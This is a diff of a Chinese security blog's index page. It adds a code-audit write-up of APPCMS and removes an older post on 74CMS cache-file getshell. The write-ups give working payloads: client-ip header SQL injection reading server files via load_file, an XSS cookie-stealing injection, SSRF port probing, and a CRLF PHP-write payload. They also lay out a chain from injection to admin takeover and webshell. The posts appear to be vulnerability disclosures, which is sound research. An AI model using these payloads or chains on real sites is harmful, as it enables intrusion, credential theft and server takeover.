@@ -236,6 +236,269 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/21/APPCMS详细审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/21/APPCMS详细审计/" itemprop="url">代码审计 | APPCMS详细审计</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-21T08:15:41+08:00">
+                2018-10-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>自己试着审计了下APPCMS,发现了一些问题,漏洞提交后写下这篇文章,记录一下。</p>
+</blockquote>
+<hr>
+<p>发下的问题:</p>
+<p>##<strong>1.配置文件用双引号 可执行任意命令</strong><br>    利用点:重装配置或后台修改网站配置时传入<code>${@phpinfo()}(可变变量)</code>即可</p>
+<p>##<strong>2.后台模板存在代码执行与任意文件读取</strong><br>    模板为php后缀结尾,直接插入代码即可执行。获取模板内容时,可指定任 意文件造成任意文件读取</p>
+<p>##<strong>3.三处任意文件删除</strong><br>(漏洞函数<code>m_del_resource()  m__delse()  m__del()</code>) 原因是都使用了底层定义的“问题”函数<code>de_resource()</code>导致</p>
+<p>其中<code>m__del()</code>处的漏洞利用:<br>先将要删除的文件写入应用的logo处,然后在删除这个应用的时候触发<br><img src="http://static.zybuluo.com/chhyx/ubga64ktt6z1fyoj24xn1li1/image_1cq8rtii81jit120p12c4l1911bjm.png" alt="image_1cq8rtii81jit120p12c4l1911bjm.png-70kB"><br><img src="http://static.zybuluo.com/chhyx/9i8f0w73zt9eeo7lgcm0ue76/image_1cq8ru0toekeghv1ss1vq11f3i1j.png" alt="image_1cq8ru0toekeghv1ss1vq11f3i1j.png-105.6kB"></p>
+<p>扩大危害:通过删除<code>install.lock.php</code>文件去重装CMS,然后在重装时,将PHP代码写进配置文件进行<code>Getshell</code>。</p>
+<p>##<strong>4.readfile()导致的ssrf漏洞:</strong><br>漏洞文件:</p>
+<pre><code>#upload\pic.php
+
+&lt;?php
+if(isset($_GET[&apos;url&apos;]) &amp;&amp; trim($_GET[&apos;url&apos;]) != &apos;&apos; &amp;&amp; isset($_GET[&apos;type&apos;])) {
+    $img_url=trim($_GET[&apos;url&apos;]);
+    $img_url = base64_decode($img_url);
+    $img_url=strtolower(trim($img_url));
+    $_GET[&apos;type&apos;]=strtolower(trim($_GET[&apos;type&apos;]));
+    //var_dump(chr(0));die();
+
+    $urls=explode(&apos;.&apos;,$img_url);
+    //var_dump($img_url);die();
+    if(count($urls)&lt;=1) die(&apos;image type forbidden 0&apos;);
+    $file_type=$urls[count($urls)-1]; 
+
+    if(in_array($file_type,array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;,&apos;jpeg&apos;))){}else{ die(&apos;image type foridden 1&apos;);}
+
+    if(strstr($img_url,&apos;php&apos;)) die(&apos;image type forbidden 2&apos;);
+
+    if(strstr($img_url,chr(0)))die(&apos;image type forbidden 3&apos;);
+    if(strlen($img_url)&gt;256)die(&apos;url too length forbidden 4&apos;);
+
+    header(&quot;Content-Type: image/{$_GET[&apos;type&apos;]}&quot;);
+
+    readfile($img_url);
+
+} else {
+    die(&apos;image not find！&apos;);
+}
+
+?&gt;
+</code></pre><p>这里<code>readfile()</code>造成ssrf漏洞</p>
+<pre><code>对传进来的url参数进行base64解码
+最后需含有.jpg         ?1.jpg即可绕过
+url不含php大小写 
+过滤chr(0)防止00截断
+长度不超过256个字符
+</code></pre><p>经测试,这个是有回显的ssrf,可用于内网探测及进一步的内网渗透</p>
+<p>利用:将<code>http://127.0.0.1:80/?1.jpg</code>经<code>base64</code>编码赋值给<code>$url</code>然后去爆破,这里我是将整个url设置为爆破参数 去爆破的</p>
+<p><img src="http://static.zybuluo.com/chhyx/9x9p8y09s4vptj7ebgf4282a/image_1cq8hnl5t1frgoui1176o5ot09.png" alt="image_1cq8hnl5t1frgoui1176o5ot09.png-89.9kB"></p>
+<p>爆破出83 81 85 89等端口是存在的</p>
+<p>漏洞利用:</p>
+<pre><code>读取非PHP文件
+探测内网开放情况
+</code></pre><p>##<strong>5.留言处insert注入:</strong><br>漏洞文件:</p>
+<pre><code>#upload\commont.php m__add()
+function m__add() {
+    ...
+    $fields[&apos;ip&apos;] = helper :: getip();//
+....
+$res = $dbm -&gt; single_insert(TB_PREFIX . &apos;comment&apos;, $fields);
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/t0bljlcchrcapy3902xowz40/image_1cq8vgsipdrjvgk1cup1fvctqf2q.png" alt="image_1cq8vgsipdrjvgk1cup1fvctqf2q.png-57.4kB"></p>
+<p>跟进<code>getip()</code>函数:</p>
+<pre><code>#upload\core\helper.class.php
+public static function getip() {
+    $onlineip = &apos;&apos;;
+    if (getenv(&apos;HTTP_CLIENT_IP&apos;) &amp;&amp; strcasecmp(getenv(&apos;HTTP_CLIENT_IP&apos;), &apos;unknown&apos;)) {
+        $onlineip = getenv(&apos;HTTP_CLIENT_IP&apos;);
+    } elseif (getenv(&apos;REMOTE_ADDR&apos;) &amp;&amp; strcasecmp(getenv(&apos;REMOTE_ADDR&apos;), &apos;unknown&apos;)) {
+        $onlineip = getenv(&apos;REMOTE_ADDR&apos;);
+    } elseif (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &apos;unknown&apos;)) {
+        $onlineip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+    }
+    return $onlineip;
+}
+</code></pre><p>很明显这里没过滤,可伪造ip与注入语句,跟进<code>single_insert()</code>函数:</p>
+<pre><code>public function single_insert($table_name, $fields) {
+...
+$sql_field = &quot;&quot;;
+$sql_value = &quot;&quot;; 
+// 遍历字段和值
+foreach($fields as $key =&gt; $value) {
+    $sql_field .= &quot;,$key&quot;;
+    $sql_value .= &quot;,&apos;$value&apos;&quot;;
+} 
+
+$sql_field = substr($sql_field, 1);
+$sql_value = substr($sql_value, 1);
+
+$sql = &quot;insert into $table_name ($sql_field) values ($sql_value)&quot;; //组合SQL
+
+var_dump($sql);
+</code></pre><p>$result = $this -&gt; query_insert($sql);<br>    return $result;<br>    }</p>
+<p>可看到这里的对传进来的<code>$fields</code>数组并无过滤,直接拼接到<code>sql</code>语句中导致注入。<br>但是这里的情况是</p>
+<pre><code>a.执行完插入评论的sql语句后的结果返回到了$res中,但是下面并没有输出$res[&apos;error&apos;]     //不能使用报错注入
+b.需要闭合一个用应用程序&quot;已经打开但还未关闭&quot;的参数(ip)
+c.这里的IP字段限制为20个字符 想直接在这个位置获取数据不太现实
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/vgrxfqy384rmasyffsmy4m06/image_1cqa4s1ce13fi176cjllun916u49.png" alt="image_1cqa4s1ce13fi176cjllun916u49.png-57.8kB"></p>
+<p>所以我们采用<code>insert</code>插入2条数据的方式将注入语句插在前台显示的字段<code>(uname,content,date_add,ip)</code>即可。(这里的<code>date_add</code>与<code>ip</code>长度限制为11、20)<br>payload:</p>
+<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,(select user()),&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/63jlre1n5oag3od5gcfi925y/image_1cq91e1cd1mv353fe1qttg1b37.png" alt="image_1cq91e1cd1mv353fe1qttg1b37.png-185.5kB"></p>
+<p>返回前台评论区查看:<br><img src="http://static.zybuluo.com/chhyx/d5im0deb7h6cin0l1jow9uhz/image_1cqa6otgtbj7175a81u1udtj422d.png" alt="image_1cqa6otgtbj7175a81u1udtj422d.png-52.9kB"><br>成功得到<code>user()</code>信息。</p>
+<p>这是两句废话:<br>如果我们改变一下ip的限制长度且将<code>$ress[&#39;error&#39;]</code>改为<code>$res[&#39;error&#39;]</code>即可报错注入。</p>
+<p><img src="http://static.zybuluo.com/chhyx/9kj23whc7egbdkt2epykvcis/image_1cqa6gpvl1jl71ups1552rlq166g1g.png" alt="image_1cqa6gpvl1jl71ups1552rlq166g1g.png-117.3kB"></p>
+<p>##<strong>注入深入利用</strong></p>
+<p>漏洞利用:参照之前笔者的文章:<a href="https://p0rz9.github.io/2018/10/17/PbootCMS_V1.2.1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">PbootCMS_V1.2.1组合漏洞之前台无限制命令执行</a>,这里我们可以用<code>insert注入+xss+来GETSHELL</code></p>
+<pre><code>1.插入xss代码获取 后台路径及管理员cookie
+2.利用load_file()任意文件读取(需知道路径)
+3.获取后台账号密码（该APPCMS更换了后台路径）
+4.后台php文件写shell
+</code></pre><p><strong>读取文件:</strong><br>我们要读取文件,首先要使其报错获取网站绝对路径:<br><img src="http://static.zybuluo.com/chhyx/23ejc5lluw9cvai8nqo2i8qz/image_1cqan4cuu1urc1upr187i1ns7q5n16.png" alt="image_1cqan4cuu1urc1upr187i1ns7q5n16.png-116.9kB"><br><img src="http://static.zybuluo.com/chhyx/e5x9prqs06fuw9t2pvh0aay6/image_1cqan2b5t18jeh2qre9usqlivp.png" alt="image_1cqan2b5t18jeh2qre9usqlivp.png-113.1kB"></p>
+<p>笔者以读取存储后台口令的文件为例:</p>
+<pre><code>core\config.php
+</code></pre><p>payload:</p>
+<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,(select SUBSTRING( load_file(&apos;C:\\web\\WWW\\appcms_2.0.101\\upload\\core\\config.php&apos;),500,300)),&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/dkandni4om7bnynr9jlz1yfo/image_1cqaqme1nsaj1b2i15j811k616nl3v.png" alt="image_1cqaqme1nsaj1b2i15j811k616nl3v.png-121kB"><br>返回前台留言板查看获取的文件内容:<br><img src="http://static.zybuluo.com/chhyx/si98287nh23iisr9tdbc65az/image_1cqaqpgqn1pv730ims81jhf1ked6c.png" alt="image_1cqaqpgqn1pv730ims81jhf1ked6c.png-112.7kB"></p>
+<p><strong>XSS:</strong><br>我们以弹cookie为例子,在实战中插入xss平台接收后台COOKIE即可。<br>payload:</p>
+<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,&apos;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&apos;,&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
+</code></pre><p>因为前台并没有登陆接口,所以弹出非登陆状态下的<code>PHPSESSION</code><br>前台留言板访问:<br><img src="http://static.zybuluo.com/chhyx/rwmq8zayn17q74l38yk7gin1/image_1cqar5dgl1fm1drn14stqlnktc7j.png" alt="image_1cqar5dgl1fm1drn14stqlnktc7j.png-88.1kB"></p>
+<p>后台管理员访问:<br><img src="http://static.zybuluo.com/chhyx/xzzenl1ornmpn1darbezjgrd/image_1cqar3c9216g4lh1ckdni8g6o76.png" alt="image_1cqar3c9216g4lh1ckdni8g6o76.png-46.8kB"></p>
+<p>平台接收后台地址及cookie后,我们进入后台用配置文件或模板处的命令执行即可拿Shell。</p>
+<p>##<strong>6.鸡肋文件包含</strong><br>在读入口文件index.php时 碰到这样一行代码:</p>
+<pre><code>require(dirname(__FILE__) . $tmp_file);
+</code></pre><p>感觉可以利用,通过追溯可控参数<code>$tmp_file</code>发现$tpl时这样取得</p>
+<pre><code>$tpl = isset($_GET[&apos;tpl&apos;]) ? $_GET[&apos;tpl&apos;] : &apos;index&apos;;
+</code></pre><p>但是下面经过了这样一处判断 经测试:</p>
+<pre><code>if (substr($tpl, strlen($tpl) - 4, 4) == &apos;.php&apos;) {
+    $tmp_file = &apos;/templates/&apos; . $from_mobile . &apos;/&apos; . $tpl;
+} else {
+    $tmp_file = &apos;/templates/&apos; . $from_mobile . &apos;/&apos; . $tpl . &apos;.php&apos;;
+}
+</code></pre><p>只能包含后缀为php的文件<br>利用的话:包含安装时的<code>step4.php</code>可看到数据库信息:</p>
+<p><img src="http://static.zybuluo.com/chhyx/6j5d44yjrravi2qu68xq5ddn/image_1cqbgbcq43gcpvf1kf20acgq1m.png" alt="image_1cqbgbcq43gcpvf1kf20acgq1m.png-66.8kB"></p>
+<p>涉及知识点:</p>
+<pre><code>$_SERVER[&quot;HTTP_CLIENT_IP&quot;] 获得的值是HTTP中 Client-Ip( client-ip书写测试结果：服务器为window环境，则client-ip可以大小写混写。服务器环境为linux，则client-ip必须全部大写) 
+
+$_SERVER[&quot;REMOTE_ADDR&quot;] 获得的值为 最后一个跟你的服务器握手的IP，可能会是代理IP或者其他 
+
+$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 获得的值是HTTP中 X-Forwarded-For 
+
+$_SERVER[&quot;HTTP_REFERER&quot;] 获得的值为 HTTP中的Referer 
+</code></pre><p><code>insert into</code>一次性插入2条语句:<br><img src="http://static.zybuluo.com/chhyx/uux01p11khk2o94uw95fmies/image_1cq8ujiqq1qrggsg1a551rf9p7g20.png" alt="image_1cq8ujiqq1qrggsg1a551rf9p7g20.png-24.3kB"><br><img src="http://static.zybuluo.com/chhyx/5zr9h8qzxkyww0ekc6os0fkg/image_1cq8uk1mi6pt15dv16cf118igvq2d.png" alt="image_1cq8uk1mi6pt15dv16cf118igvq2d.png-12.1kB"></p>
+<p>关于insert into注入 在最后一个字段的注入可以利用<code>当一个整数与一个字符相加时,整数具有操作符优先级</code><br>参考链接:<a href="https://blog.csdn.net/qq_41007744/article/details/80213449?utm_source=blogxgwz0" target="_blank" rel="noopener">https://blog.csdn.net/qq_41007744/article/details/80213449?utm_source=blogxgwz0</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2123,162 +2386,11 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/02/74CMS缓存设计缺陷导致getshell/" itemprop="url">代码审计 | 74CMS缓存设计缺陷导致getshell</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-02T10:15:41+08:00">
-                2018-10-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。</p>
-</blockquote>
-<hr>
-<p>审计cms：<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:用了<code>Thinkphp3.2.3</code>改写的缓存函数<code>set()</code>方法,而这个方法对写入的内容只进行了<code>serialize()</code>函数过滤操作,导致可用<code>%0D%0A</code>进行换行写入<code>php</code>代码而<code>getshell</code></p>
-<p>##<strong>1.基础知识:</strong><br><code>Thinkphp</code>的一些基本操作可参考文章:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
-<p>##<strong>2.环境搭建:</strong><br>创建一个企业用户用于验证漏洞即可</p>
-<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
-<pre><code>url:http://127.0.0.1:84/index.php?m=&amp;c=Company&amp;a=com_auth
-POST:anew=1&amp;certificate_img_up=%2F%2F%0D%0Aphpinfo();//
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
-<p>##<strong>4.代码分析:</strong><br>相关变量已写入注释中：</p>
-<pre><code>#home\controller\companyController.class.php
-public function com_auth(){
-    ...
-    if(IS_POST &amp;&amp; $this-&gt;company_profile[&apos;audit&apos;]!=1){
-        $data[&apos;certificate_img&apos;] = I(&apos;post.certificate_img_up&apos;,&apos;&apos;,&apos;trim,badword&apos;);
-        $data[&apos;audit&apos;] = 2;
-    ...
-    if($this-&gt;company_profile[&apos;audit&apos;] == 0 || ($this-&gt;company_profile[&apos;audit&apos;] != 1 &amp;&amp; I(&apos;request.anew&apos;,0,&apos;intval&apos;) == 1)){
-        S(&apos;certificate_img_&apos; . $this-&gt;company_profile[&apos;uid&apos;],$this-&gt;company_profile[&apos;certificate_img&apos;]);
-    }
-    ...
-}
-</code></pre><p>这里在造成漏洞的原理是底层的tp框架的锅, 笔者前几天写过分析文章:<br><a href="https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/</a><br>我们这里再照常分析一遍代码流程:<br>跟进<code>TP</code>框架自带的<code>S()</code>缓存方法:<br><img src="http://static.zybuluo.com/chhyx/layesh9qbvqn0ouktr9ilpng/image_1coqjmno01prl1qtah9718cn4im9.png" alt="image_1coqjmno01prl1qtah9718cn4im9.png-100.5kB"></p>
-<p>跟进<code>set()</code>方法:</p>
-<pre><code>Librayr\Think\Cache\Driver\File.class.php 
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png" alt="image_1coqk0d8k19e511civine11hngm.png-95.1kB"></p>
-<p>跟进<code>filename()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/e6ppb2w8sof1u12rau4khhjs/image_1coqk5e7ro91oa92l11l991k4913.png" alt="image_1coqk5e7ro91oa92l11l991k4913.png-69.4kB"></p>
-<p><code>uid</code>为2得到的缓存文件名:<br><img src="http://static.zybuluo.com/chhyx/eghf8hflkq2jyclqf0n4w71o/image_1coqknv8vc5c6kf146l1hq11khj1g.png" alt="image_1coqknv8vc5c6kf146l1hq11khj1g.png-29.8kB"></p>
-<p>因为这里的<code>$filename</code>与<code>$name</code>相关联,而<code>$name</code>与<code>$uid</code>相关联<br>就是说我们可以根据用户的<code>uid</code>来得到缓存文件名 进而可<code>getshell</code><br><img src="http://static.zybuluo.com/chhyx/m1gq5ipikux0b1t8qkqi9y6w/image_1coql21hfvtdeae5l418hs9021t.png" alt="image_1coql21hfvtdeae5l418hs9021t.png-151.8kB"><br><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
-<p><code>uid</code>可在个人主页看到:<br><img src="http://static.zybuluo.com/chhyx/13fya1esr4q0z309key35hsj/image_1coqmpc8hsc515brgk313ra1ben2n.png" alt="image_1coqmpc8hsc515brgk313ra1ben2n.png-86.2kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2324,7 +2436,7 @@ public function com_auth(){
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
